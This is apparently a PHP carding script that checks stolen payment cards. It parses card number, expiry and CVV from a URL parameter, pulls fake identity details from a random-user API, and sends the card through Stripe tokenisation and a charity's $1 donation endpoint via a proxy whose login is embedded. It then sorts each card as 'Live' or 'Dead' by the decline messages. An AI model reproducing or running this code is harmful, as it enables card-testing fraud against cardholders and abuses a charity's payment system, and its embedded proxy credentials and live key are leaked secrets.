<?php

error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];



function getStr2($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/
$ch = curl_init('');
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'http://zproxy.lum-superproxy.io:22225');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'lum-customer-hl_2540495b-zone-static:g6virm38eayq');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78',
'Origin: https://checkout.stripe.com',
'Referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=561f39d7-72cb-0708-1bff-23a6263992f8'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  'email=abhiyanqwe%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F551a9ed)&referrer=https%3A%2F%2Fromero.mercycommunity.org.au%2Fdonate%2F&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=Texa+LOl&card[address_line1]=4283+Express+Lane&card[address_city]=sarasota&card[address_state]=FL&card[address_zip]=34249&card[address_country]=United+States&time_on_page=62202&guid=af14a93b-8b72-436b-8e14-90bb703993ea&muid=a0ab5dc8-564e-467a-8633-b87f2b0334cd&sid=ecad1248-6c38-4ddc-8c56-7046debb5c8a&key=pk_live_ENpCAEI7OOkqeDauRnZvxTpX');

$c = curl_exec($ch);

$token = trim(strip_tags(getstr($c,'id": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://mercy-stripe.xct01.com/donate.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78',
'Content-Type: text/plain;charset=UTF-8',
'Origin: https://romero.mercycommunity.org.au',
'Referer: https://romero.mercycommunity.org.au/donate/',
'Connection: keep-alive'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  '{"amount":"1","plan":null,"frequency":"one-off","currency":"aud","email":"texas1123@gmail.com","token":"'.$token.'","description":"Romero Centre - $1 Gift"}');
$a = curl_exec($ch);
$message = trim(strip_tags(getstr(a,'"message":"','"')));
if (strpos($a, "Your card's security code is incorrect.")) {
 echo '<span class="badge badge-success">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b style="color: white;"> ❤Live❤ '.$bin.'('.$banco.'-'.$nivel.') IAMREDEYES <br>';
  }
else if(substr_count($c, 'incorrect_number') > 0){
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b> ❌ Invalid ❌  IAMREDEYES</b>';
  exit();
  }
  
else if (strpos($c, "Your card's security code is incorrect.")) {
 echo '<span class="badge badge-success">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b style="color: white;"> ❤ Live ❤ '.$bin.'('.$banco.'-'.$nivel.') IAMREDEYES <br>';
  }





else if (strpos($c, "Your card does not support this type of purchase.")) {
  echo '<span class="badge badge-danger">Rejected</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Blocked 🔴'.$bin.'() IAMREDEYES </b>';
}


else if (strpos($a, "Your card was declined.")) {
  echo '<span class="badge badge-danger">Rejected</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Dead 🔴'.$bin.'() IAMREDEYES </b>';
}


else if (strpos($a, "Your card number is incorrect.")) {
  echo '<span class="badge badge-danger">Rejected</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b> ❌ Invalid ❌  IAMREDEYES</b>';
}

else if (strpos($a, "Your card does not support this type of purchase.")) {
  echo '<span class="badge badge-danger">Rejected</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Blocked 🔴'.$bin.'() IAMREDEYES </b>';
}
else if (strpos($c, "Your card was declined.")) {
  echo '<span class="badge badge-danger">Rejected</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Dead 🔴'.$bin.'() IAMREDEYES </b>';
}
else {
 echo '<span class="badge badge-danger">Rejected</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Unknown 🔴 '.$bin.'() IAMREDEYES </b>';
}


?>